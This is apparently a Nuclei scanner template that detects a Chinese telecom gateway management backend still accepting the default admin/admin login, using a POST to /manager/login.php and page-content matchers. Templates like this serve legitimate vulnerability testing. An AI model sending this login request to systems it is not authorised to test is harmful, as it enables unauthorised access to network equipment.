id: telecom-gateway-default-login
info:
  author: ritikchaddha
  name: Telecom Gateway Default Login
  severity: high
  tags: telecom,default-login,gateway
requests:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - "<title>\u7535\u4FE1\u7F51\u5173\u670D\u52A1\u5668\u7BA1\u7406\u540E\u53F0</title>"
    - index-shang.php
    - di.php
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /manager/login.php HTTP/1.1

    Host: {{Hostname}}


    Name={{username}}&Pass={{password}}

    '
  redirects: true
